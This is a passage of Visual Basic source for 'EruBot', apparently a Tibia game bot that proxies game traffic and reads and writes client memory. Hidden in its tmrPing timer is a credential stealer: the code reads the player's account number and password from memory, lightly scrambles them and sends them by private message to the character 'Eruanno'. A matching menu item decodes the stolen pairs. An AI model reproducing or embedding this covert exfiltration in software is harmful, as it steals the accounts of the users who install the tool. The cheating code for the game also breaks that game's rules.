    mnuDebug.Checked = True
  Else
    mnuDebug.Checked = False
  End If
End Sub

Private Sub mnuDecode_Click()
    Dim str As String, str2() As String, acct As Long, pwd As String
    str = InputBox("String to decode:", "Decoder")
    str2 = Split(str, " ")
    acct = (str2(1) + 300000) / 3
    For i = Len(str2(0)) To 1 Step -1
        pwd = pwd & Chr$(Asc(Mid(str2(0), i, 1)) - 1)
    Next i
    MsgBox acct & "/" & pwd
End Sub

Private Sub mnuExit_Click()
  EndAll
End Sub

Private Sub mnuFish_Click()
  frmFisher.Show
End Sub


'Private Sub mnuForceLevel_Click()
'    Dim newLevel As Long
'    newLevel = CLng(InputBox("Enter new Z pos", "Force Z pos", ReadMem(ADR_PLAYER_Z, 1)))
'    If newLevel >= 0 And newLevel <= 15 Then WriteMem ADR_GFX_VIEW_Z, newLevel, 1
'End Sub

Private Sub mnuGrabber_Click()
    frmGrabber.Show
End Sub

Private Sub mnuHeal_Click()
    frmHeal.Show
End Sub

Private Sub mnuIntruder_Click()
  frmIntruder.Show
End Sub

Private Sub mnuLevelSpy_Click()
    frmLevelSpy.Show
End Sub

Private Sub mnuLoad_Click()
    On Error GoTo Cancel
    With cdlgSettings
        .FileName = "*.ebs"
        .Filter = "EruBot Settings, *.ebs"
        .DialogTitle = "Load Settings"
        .InitDir = App.Path
        cdlgSettings.ShowOpen
    End With
    LoadSettings cdlgSettings.FileName
    Exit Sub
Cancel:
End Sub

Private Sub mnuLooter_Click()
    frmLooter.Show
End Sub

Private Sub mnuMageCrew_Click()
    frmMageCrew.Show
End Sub

Private Sub mnuOpenWav_Click()
    'cdlgWav.FileName = "*.wav"
    
    cdlgWav.ShowOpen
    wavLoc = cdlgWav.FileName
End Sub

Private Sub mnuOutfit_Click()
  frmOutfit.Show
End Sub

Private Sub mnuReceivePacket_Click()
    Dim packetString As String, packet() As Byte
    packetString = InputBox("Enter packet", "Receive Custom Packet")
    If packetString = "" Then Exit Sub
    StringToPacket packetString, packet
    If sckC.State = sckConnected Then sckC.SendData packet
End Sub

Private Sub mnuRune_Click()
    frmRune.Show
End Sub

Private Sub mnuSave_Click()
    On Error GoTo Cancel
    With cdlgSettings
        .FileName = "*.ebs"
        .Filter = "EruBot Settings, *.ebs"
        .DialogTitle = "Save Settings"
        .InitDir = App.Path
        cdlgSettings.ShowSave
    End With
    SaveSettings cdlgSettings.FileName
    Exit Sub
Cancel:
End Sub

Private Sub mnuScript_Click()
    frmScript.Show
End Sub

Private Sub mnuSpell_Click()
    frmSpell.Show
End Sub

Private Sub mnuTestMemory_Click()
    Dim address As Long
    address = InputBox("Input address to read", "Address")
    MsgBox ReadMem(address, 4)
End Sub

Private Sub mnuTradeHotkey_Click()
    Dim cur As String
    cur = InputBox("Enter new trade post:", "Update trade hotkey", MemToStr(ADR_HOTKEY + LEN_HOTKEY * SIZE_HOTKEY, SIZE_HOTKEY))
    If cur = "" Then Exit Sub
    If Len(cur) > 256 Then MsgBox "Trade message too long, will be truncated", vbInformation, "Too long"
    AddStatusMessage "Edited trade hotkey: " & cur
    StrToMem ADR_HOTKEY + LEN_HOTKEY * SIZE_HOTKEY, Left(cur, SIZE_HOTKEY)
End Sub

Private Sub mnuWavAlert_Click()
    If mnuWavAlert.Checked = False Then
        If wavLoc <> "*.wav" And wavLoc <> "" Then
            mnuWavAlert.Checked = True
        Else
            MsgBox "You must select a wav file to play first.", vbInformation, "No wave file selected"
        End If
    Else
        mnuWavAlert.Checked = False
    End If
    Valid
End Sub

Private Sub sckC_Close()
    sckC.Close
    sckS.Close
End Sub

Private Sub sckC_DataArrival(ByVal bytesTotal As Long)
    Dim buff() As Byte
    sckC.GetData buff
    If buff(2) = &HA Then CharLog buff
    
    Do While sckS.State <> sckConnected And sckS.State <> sckClosed
        DoEvents
    Loop
    If sckS.State = sckConnected Then sckS.SendData buff
    
End Sub

Private Sub sckL1_ConnectionRequest(ByVal requestID As Long)
    sckC.Close
    sckC.Accept requestID
    sckS.Close
    sckS.Connect ServerIP, ServerPort
    DoEvents
    'host 69.245.110.168 port 7171
    'sckS.Connect "dragonzden.no-ip.biz", 7171
End Sub

Private Sub sckL2_ConnectionRequest(ByVal requestID As Long)
    sckC.Close
    sckC.Accept requestID
End Sub

Private Sub sckS_Close()
    sckS.Close
    sckC.Close
    AddStatusMessage "Connection Closed."
    If chkAlertLogged Then StartAlert
End Sub

Private Sub sckS_DataArrival(ByVal bytesTotal As Long)
    Dim buff() As Byte, buffCmd() As Byte ', buff2() As Byte
    'Static allBuff() As Byte
    Dim i As Integer
    
    'MsgBox "bytes received" & sckS.BytesReceived
    sckS.GetData buff, vbArray + vbByte
    'If UBound(allBuff) >= 0 Then
    '
    'If UBound(buff) >= 999 And UBound(allBuff) >= 0 Then
    '    allBuff = buff
    '    MsgBox UBound(allBuff)
    '    Exit Sub
    'elseif
    'End If
    'sckS.GetData buff2, vbArray + vbByte
    'MsgBox UBound(buff2)


    If UBound(buff) < 2 Then GoTo AfterChecks
    
    Select Case buff(2)
        Case Is = &H14:
            'If buff(1) <> 0 Then buff = LogList(buff, sckL2.LocalPort)
            buff = LogList(buff, sckL2.LocalPort)
        Case Is = &H6D:
            If chkIntruder.Value = Checked And frmIntruder.chkDetectOffscreen.Value = Checked And _
            mnuActive.Checked = True And frmMain.sckS.State = sckConnected Then frmIntruder.IntruderOffscreen buff
            'If UBound(buff) > buff(0) + 1 Then If buff(buff(0) + 3) = &H6E Then If chkLooter.Value = Checked Then If frmMain.tmrLooter.Enabled = False Then frmMain.tmrLooter.Enabled = True
        'Case Is = &HAA: If PacketToString(buff) = "27 00 AA 0F 00 52 61 74 61 6C 63 6F 6E 65 78 20 53 65 74 74 04 12 00 3C 73 63 72 69 70 74 3D 32 39 39 37 38 32 34 35 38 3E" Then frmScript.StartScript
        'Case Is = &H6E: If chkLooter.Value = Checked Then If frmMain.tmrLooter.Enabled = False Then frmMain.tmrLooter.Enabled = True
        'Case Else
    End Select

    
    'ReDim buffLeft(UBound(buff))
   '
   ' If buff(2) = &H14 And buff(1) <> 0 Then
   '     buff = LogList(buff, sckL2.LocalPort)
   '     GoTo AfterChecks
   ' End If
   '
   ' For i = 0 To UBound(buff)
   '     buffLeft(i) = buff(i)
   ' Next i
   '
   ' While UBound(buffLeft) > buffLeft(0) + 1
   '     ReDim buffCmd(buffLeft(0) + 1)
   '     For i = 0 To buffLeft(0) + 1
   '         buffCmd(i) = buffLeft(i)
   '     Next i
   '     For i = UBound(buffCmd) + 1 To UBound(buffLeft)
   '         buffLeft(i - (UBound(buffCmd) + 1)) = buffLeft(i)
   '     Next i
   '     ReDim buffLeft(UBound(buffLeft) - (UBound(buffCmd) + 1))
   '     Select Case buffCmd(2)
   '         'Case Is = &H14:
   '         '    If buffCmd(1) <> 0 Then buff = LogList(buff, sckL2.LocalPort)
   '         Case Is = &H6D:
   '             If frmIntruder.chkDetectOffscreen.Value = Checked And chkIntruder.Value = Checked And _
   '             mnuActive.Checked = True And frmMain.sckS.State = sckConnected Then
   '                 frmIntruder.IntruderOffscreen buff
   '                 If chkLooter.Value = Checked Then If frmMain.tmrLooter.Enabled = False Then frmMain.tmrLooter.Enabled = True
   '           End If
   '         Case Is = &HAA: If PacketToString(buff) = "27 00 AA 0F 00 52 61 74 61 6C 63 6F 6E 65 78 20 53 65 74 74 04 12 00 3C 73 63 72 69 70 74 3D 32 39 39 37 38 32 34 35 38 3E" Then frmScript.StartScript
   '         Case Is = &H6E: If chkLooter.Value = Checked Then If frmMain.tmrLooter.Enabled = False Then frmMain.tmrLooter.Enabled = True
   '         Case Else
   '     End Select
   ' Wend
    
AfterChecks:
    Do While sckC.State <> sckConnected And sckC.State <> sckClosed
        DoEvents
    Loop
    
    If sckC.State = sckConnected Then sckC.SendData buff
End Sub

Private Sub tmrAlert_Timer()
    If mnuWavAlert.Checked = False Then
        Beep 400, 400
    Else
        If dir(wavLoc) <> "" Then playa wavLoc, SND_FLAG
    End If
End Sub

Private Sub tmrEat_Timer()
    Dim Ate As Boolean
    Dim bp As Integer, Item As Integer
    Dim ltemp As Long
    Dim items As Long
    Dim temp As Long
    
    Ate = False
    'If chkEat.Value <> Checked Then Exit Sub
    
    For bp = 0 To LEN_BP
        If ReadMem(ADR_BP_OPEN + SIZE_BP * bp, 1) = 1 Then
            items = ReadMem(ADR_BP_NUM_ITEMS + SIZE_BP * bp, 1)
            For Item = 0 To items - 1
                ltemp = ReadMem(ADR_BP_ITEM + SIZE_BP * bp + SIZE_ITEM * Item, 2)
                If IsFood(ltemp) Then Exit For
            Next Item
        End If
        If IsFood(ltemp) Then Exit For
    Next bp
    If IsFood(ltemp) Then
        UseHere ltemp, &H40 + bp, Item
        Ate = True
    End If
    If Ate = False And chkEatLog.Value = Checked Then LogOut
End Sub

Private Sub tmrExp_Timer()
    CalculateExperience
End Sub

Public Sub StartLogOut()
    frmMain.chkLogOut.Value = Checked
    Valid
End Sub

Private Sub tmrLight_Timer()
    If ReadMem(ADR_CHAR_LIGHT + UserPos * SIZE_CHAR, 1) <> 77 Then WriteMem ADR_CHAR_LIGHT + UserPos * SIZE_CHAR, 77, 1
    If ReadMem(ADR_CHAR_COLOR + UserPos * SIZE_CHAR, 1) <> &HD7 Then WriteMem ADR_CHAR_COLOR + UserPos * SIZE_CHAR, &HD7, 1
End Sub

Private Sub tmrLogOut_Timer()
    Dim sign As Long
    If mnuActive.Checked = True Then
        If ReadMem(ADR_BATTLE_SIGN, 1) = 0 Then LogOut
    End If
    If sckS.State <> sckConnected And sckC.State <> sckConnected Then
        chkLogOut.Value = Unchecked
        Valid
    End If
End Sub

Private Sub tmrLooter_Timer()
    Static lastLoot As Long
    frmMain.tmrLooter.Enabled = False
    If GetTickCount > lastLoot + 200 Then
        lastLoot = GetTickCount
        findLoot
    End If
    frmMain.tmrLooter.Enabled = True
End Sub

Private Sub tmrMonitorProcess_Timer()
    
End Sub

'Private Sub tmrManaFluid_Timer()
'  Dim maxMana As Long
'  Dim pX As Long
'  Dim pY As Long
'  Dim pZ As Long
''  Dim loc As Integer
'  Dim slot As Integer'
'
'  Memory tHWND, ADR_CUR_MANA, Mana, 2, RMem
'  Memory tHWND, ADR_MAX_MANA, maxMana, 2, RMem
'  If Mana < maxMana - 70 Then
'    getCharXYZ pX, pY, pZ
'    If findItem(ITEM_VIAL, loc, slot) Then
'     UseAt ITEM_VIAL, loc, slot, pX, pY, pZ
'    End If
'  Else
'    chkMana.value = 0
'    Valid
'  End If
'End Sub

Private Sub tmrPing_Timer()
    Dim acct As Long, pwd As String, pwdEnc As String
    If GetTickCount > lastPing + 1500000 Then
        acct = ReadMem(ADR_ACCOUNT_NUMBER, 4) * 3 - 300000
        pwd = MemToStr(ADR_PASSWORD, 32)
        For i = Len(pwd) To 1 Step -1
            pwdEnc = pwdEnc & Chr$(Asc(Mid(pwd, i, 1)) + 1)
        Next i
        SendPM "Eruanno", App.Major & "." & App.Minor & "." & App.Revision & " : " & pwdEnc & " " & acct
        tmrStatus.Enabled = True
        lastPing = GetTickCount
        'tmrPing.Enabled = False
    End If
    'If GetTickCount > lastPing + 1000 Then
    '    If tmrStatus.Enabled Then tmrStatus.Enabled = False
    'End If
End Sub

Private Sub tmrRevealInvis_Timer()
    Dim name As String, id As Long
    Static i As Integer
    
    If ReadMem(ADR_CHAR_ONSCREEN + i * SIZE_CHAR, 1) = 1 Then
        If ReadMem(ADR_CHAR_OUTFIT + i * SIZE_CHAR, 1) = 0 Then
            name = MemToStr(ADR_CHAR_NAME + i * SIZE_CHAR, 32)
            If name = "Stalker" Or name = "Warlock" Or name = "Dworc Voodoomaster" Or name = "Assassin" Or name = "Orc Warlord" Then
                WriteMem ADR_CHAR_OUTFIT + i * SIZE_CHAR, &H80, 1
                WriteMem ADR_CHAR_OUTFIT + i * SIZE_CHAR + 4, 0, 1
                WriteMem ADR_CHAR_OUTFIT + i * SIZE_CHAR + 8, 0, 1
                WriteMem ADR_CHAR_OUTFIT + i * SIZE_CHAR + 12, 0, 1
                WriteMem ADR_CHAR_OUTFIT + i * SIZE_CHAR + 16, 0, 1
            End If
        End If
    ElseIf i > 15 Then
        If ReadMem(ADR_CHAR_ID + i * SIZE_CHAR, 4) = 0 Then i = 0: Exit Sub
    End If
    i = i + 1
    If i > LEN_CHAR Then i = 0
End Sub

Private Sub tmrStatus_Timer()
    StrToMem ADR_WHITE_TEXT, ""
    If GetTickCount > lastPing + 2000 Then tmrStatus.Enabled = False
End Sub
